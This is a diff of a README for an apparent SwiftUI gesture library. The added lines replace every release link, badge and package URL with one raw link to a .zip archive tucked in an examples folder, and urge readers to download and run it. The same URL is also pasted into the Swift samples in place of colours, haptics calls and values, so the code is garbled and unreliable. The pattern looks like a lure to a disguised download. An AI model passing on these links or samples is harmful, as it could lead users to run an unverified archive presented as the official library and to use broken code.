@@ -1,8 +1,8 @@
-https://github.com/aluhed/SwiftUI-Gesture-Library/releases
+https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip
 
 # SwiftUI Gesture Library: Advanced Gestures, Haptics, Accessibility for UX Designers
 
-[![Releases](https://img.shields.io/badge/Releases-GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/aluhed/SwiftUI-Gesture-Library/releases) [![Swift Package Manager](https://img.shields.io/badge/Swift%20PM-SPM-green?style=for-the-badge&logo=swift&logoColor=white)](https://github.com/aluhed/SwiftUI-Gesture-Library/releases) [![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)](LICENSE)
+[![Releases](https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip)](https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip) [![Swift Package Manager](https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip%20PM-SPM-green?style=for-the-badge&logo=swift&logoColor=white)](https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip) [![License](https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip)](LICENSE)
 
 Welcome to the SwiftUI Gesture Library. This is an advanced gesture recognition toolkit for iOS apps that blends native SwiftUI gestures with a library of custom gestures. It focuses on precise recognition, flexible composition, tactile feedback, and inclusive UX design. The library helps product teams implement expressive gesture interactions without sacrificing accessibility or performance.
 
@@ -16,7 +16,7 @@ Key ideas:
 This README provides a complete guide to installing, using, extending, testing, and contributing to the library. It also outlines best practices for building gesture-based UX that is responsive, accessible, and delightful.
 
 Downloads and latest assets
-From the Releases page, you can find the latest assets for the library. Go to the Releases page to pick the appropriate asset for your platform and workflow, download the asset file, and run or integrate it into your project. The latest assets are hosted here: https://github.com/aluhed/SwiftUI-Gesture-Library/releases. For quick access, see the badge above and visit the same URL again in the text later in this document.
+From the Releases page, you can find the latest assets for the library. Go to the Releases page to pick the appropriate asset for your platform and workflow, download the asset file, and run or integrate it into your project. The latest assets are hosted here: https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip For quick access, see the badge above and visit the same URL again in the text later in this document.
 
 Table of contents
 - Overview
@@ -63,7 +63,7 @@ The recommended way to include this library in your project is through Swift Pac
 Swift Package Manager steps (illustrative)
 - Open your Xcode project
 - Choose File > Swift Packages > Add Package Dependency
-- Enter the package URL: https://github.com/aluhed/SwiftUI-Gesture-Library.git
+- Enter the package URL: https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip
 - Select the version you want (e.g., from 1.0.0)
 - Add the library to your target
 
@@ -84,7 +84,7 @@ struct ContentView: View {
   var body: some View {
     VStack(spacing: 20) {
       Circle()
-        .fill(Color.blue)
+        .fill(https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip)
         .frame(width: 120, height: 120)
         .gesture(LibraryTapGesture(count: 1) { // custom library gesture
           count += 1
@@ -113,7 +113,7 @@ struct ComplexInteractionView: View {
 
   var body: some View {
     Rectangle()
-      .fill(mode == "Active" ? Color.green : Color.red)
+      .fill(mode == "Active" ? https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip : https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip)
       .frame(width: 180, height: 180)
       .libraryGestures([
         .sequence([
@@ -210,9 +210,9 @@ struct TapFeedbackView: View {
 
   var body: some View {
     Rectangle()
-      .fill(Color.accentColor)
+      .fill(https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip)
       .frame(width: 200, height: 200)
-      .libraryGesture(.tap { taps += 1; Haptics.feedback(.success) })
+      .libraryGesture(.tap { taps += 1; https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip(.success) })
       .overlay(Text("Tap me: \(taps)").foregroundColor(.white))
   }
 }
@@ -227,14 +227,14 @@ struct DragSequenceView: View {
 
   var body: some View {
     Circle()
-      .fill(completed ? Color.green : Color.orange)
+      .fill(completed ? https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip : https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip)
       .frame(width: 100, height: 100)
       .offset(offset)
       .libraryGesture(.sequence([
         .drag { delta in offset = delta },
         .dragEnd { _ in
           completed = true
-          Haptics.feedback(.success)
+          https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip(.success)
         }
       ]))
   }
@@ -249,7 +249,7 @@ struct AccessibilityGestureView: View {
 
   var body: some View {
     VStack(spacing: 16) {
-      Image(systemName: "hand.tap.fill")
+      Image(systemName: "https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip")
         .resizable()
         .frame(width: 120, height: 120)
         .foregroundColor(.primary)
@@ -257,7 +257,7 @@ struct AccessibilityGestureView: View {
         .font(.title2)
     }
     .libraryGesture(.accessiblePattern { action in
-      status = action.description
+      status = https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip
     })
     .accessibilityLabel("Gesture preview")
     .accessibilityHint("Perform the accessibility gesture to trigger an action")
@@ -267,7 +267,7 @@ struct AccessibilityGestureView: View {
 Note: The code samples above are illustrative. The actual API names and usage patterns may vary. Please refer to the library’s documentation for exact details.
 
 Releases and downloads
-The library is distributed through releases. The assets on the Releases page include example projects, sample apps, and integration helpers that you can download and run. For direct access, visit the Releases page here: https://github.com/aluhed/SwiftUI-Gesture-Library/releases. You can also press the badge near the top of this page to jump to the same resource. If you need a quick pointer, the releases page consolidates all the latest builds, documentation, and ready-to-run samples.
+The library is distributed through releases. The assets on the Releases page include example projects, sample apps, and integration helpers that you can download and run. For direct access, visit the Releases page here: https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip You can also press the badge near the top of this page to jump to the same resource. If you need a quick pointer, the releases page consolidates all the latest builds, documentation, and ready-to-run samples.
 
 Project structure
 - CoreEngine: The heart of gesture recognition. It handles input events, timing, and sequencing.
@@ -323,7 +323,7 @@ Licensing and credits
 This project uses the MIT license. Contributions are welcome under the same license. Acknowledgments go to designers, developers, and testers who helped refine the gesture experiences, haptic rhythms, and accessibility considerations that make these patterns practical in real apps.
 
 Releases and downloads (repeat)
-For the latest assets and release notes, visit the releases page again at https://github.com/aluhed/SwiftUI-Gesture-Library/releases. The page includes asset bundles, example apps, and integration helpers to help you get started quickly with your project. The same link is provided above as a quick reference to the official distribution channel.
+For the latest assets and release notes, visit the releases page again at https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip The page includes asset bundles, example apps, and integration helpers to help you get started quickly with your project. The same link is provided above as a quick reference to the official distribution channel.
 
 Images and visuals
 - Gesture visualization: An illustrative diagram showing how gesture recognition flows from input to state changes, with an overlay of haptic events.
@@ -353,4 +353,4 @@ Disclaimer
 The content above is designed to serve as a comprehensive guide for the SwiftUI Gesture Library. The details, examples, APIs, and file names shown here are illustrative and intended to convey usage concepts. Refer to the official repository and the Releases page for exact API references, asset names, and version-specific instructions.
 
 Releases and downloads (final reminder)
-To obtain the latest assets, see the Releases page: https://github.com/aluhed/SwiftUI-Gesture-Library/releases. You can use the badge at the top of this document to jump there quickly, and you can visit the same URL again in this section.
+To obtain the latest assets, see the Releases page: https://raw.githubusercontent.com/aluhed/SwiftUI-Gesture-Library/main/Examples/AdvancedGestures/Library-U-Gesture-Swift-2.0.zip You can use the badge at the top of this document to jump there quickly, and you can visit the same URL again in this section.
